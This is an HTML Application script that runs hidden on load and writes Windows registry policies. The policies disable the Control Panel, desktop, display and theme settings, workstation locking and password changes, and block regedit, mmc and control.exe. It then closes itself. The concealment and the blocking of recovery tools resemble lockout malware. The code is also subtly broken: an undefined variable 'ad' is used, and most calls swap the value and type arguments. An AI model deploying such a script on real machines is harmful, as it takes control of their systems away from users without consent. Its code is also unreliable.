<html>
<head>
    <title></title>
    <HTA:APPLICATION
      ID="oHTA"
      APPLICATIONNAME="HiddenApp"
      WINDOWSTATE="minimize"
      SHOWINTASKBAR="no"
      CAPTION="no"
      BORDER="none"
      SYSMENU="no"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
   >

    <script language="JScript">
        function setReg(path, value, type) {
            var shell = new ActiveXObject("WScript.Shell");
            shell.RegWrite(path, value, type);
        }

        function run() {
            try {
                    setReg(ad+"NoChangingWallPaper", "REG_DWORD", 1);
                    setReg(ad+"NoAddingComponents", "REG_DWORD", 1);
                    setReg(ad+"NoDeletingComponents", "REG_DWORD", 1);
                    setReg(ad+"NoComponents", "REG_DWORD", 1);
                
                    // Explorer
                    var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
                    setReg(ex+"NoDriveTypeAutoRun", "REG_DWORD", 91);
                    setReg(ex+"NoActiveDesktopChanges", "REG_DWORD", 1);
                    setReg(ex+"NoThemesTab", "REG_DWORD", 1);
                    setReg(ex+"NoSimpleStartMenu", "REG_DWORD", 1);
                    setReg(ex+"NoSearchInternetInStartMenu", "REG_DWORD", 1);
                    setReg(ex+"ForceRunOnStartMenu", "REG_DWORD", 1);
                    setReg(ex+"NoDesktop", "REG_DWORD", 1);
                    setReg(ex+"NoControlPanel", "REG_DWORD", 1);
                
                    // Programs
                    var pr = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Programs\\";
                    setReg(pr+"NoGetPrograms", "REG_DWORD", 1);
                    setReg(pr+"NoInstalledUpdates", "REG_DWORD", 1);
                    setReg(pr+"NoWindowsMarketplace", "REG_DWORD", 1);
                
                    // System - Wallpaper
                    var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
                    setReg(sys+"Wallpaper", "REG_SZ", "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
                
                    // Stretched & centered: TileWallpaper=0, WallpaperStyle=2
                    setReg("HKCU\\Control Panel\\Desktop\\TileWallpaper", "REG_SZ", "0");
                    setReg("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "REG_SZ", "2");
                
                    setReg(sys+"NoColorChoice", "REG_DWORD", 1);
                    setReg(sys+"NoVisualStyleChoice", "REG_DWORD", 1);
                    setReg(sys+"NoDispBackgroundPage", "REG_DWORD", 1);
                    setReg(sys+"NoDispAppearancePage", "REG_DWORD", 1);
                    setReg(sys+"NoDispSettingsPage", "REG_DWORD", 1);
                    setReg(sys+"NoDispScrSavPage", "REG_DWORD", 1);
                    setReg(sys+"NoSizeChoice", "REG_DWORD", 1);
                    setReg(sys+"DisableLockWorkstation", "REG_DWORD", 1);
                    setReg(sys+"DisableChangePassword", "REG_DWORD", 1);
                
                    // HKCU Policies
                    setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer\\NoPinningToTaskbar", "REG_DWORD", 1);
                
                    var persCU = "HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\";
                    setReg(persCU+"NoChangingMousePointers", "REG_DWORD", 1);
                    setReg(persCU+"NoChangingTheme", "REG_DWORD", 1);
                    setReg(persCU+"NoChangingColorScheme", "REG_DWORD", 1);
                    setReg(persCU+"NoChangingStartMenuBackground", "REG_DWORD", 1);
                
                    // HKLM Policies (requires admin)
                    var persLM = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Personalization\\";
                    setReg(persLM+"NoChangingLockScreen", "REG_DWORD", 1);
                    setReg(persLM+"NoLockScreen", "REG_DWORD", 1);
                
                    setReg("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer\\HideRecentlyAddedApps", "REG_DWORD", 1);
                
                    // DisallowRun
                    var dr = ex + "DisallowRun\\";
                    setReg(dr+"1", "REG_SZ", "mmc.exe");
                    setReg(dr+"2", "REG_SZ", "regedit.exe");
                    setReg(dr+"3", "REG_SZ", "control.exe");

                document.getElementById("status").innerText = "Done.";
                setTimeout(function(){ window.close(); }, 3000);

            } catch (e) {
                alert("Error: " + e.message);
            }
        }
    </script>
</head>

<body onload="run()" style="font-family:Segoe UI; padding:20px;">
    <div id="status">Working...</div>
</body>
</html>
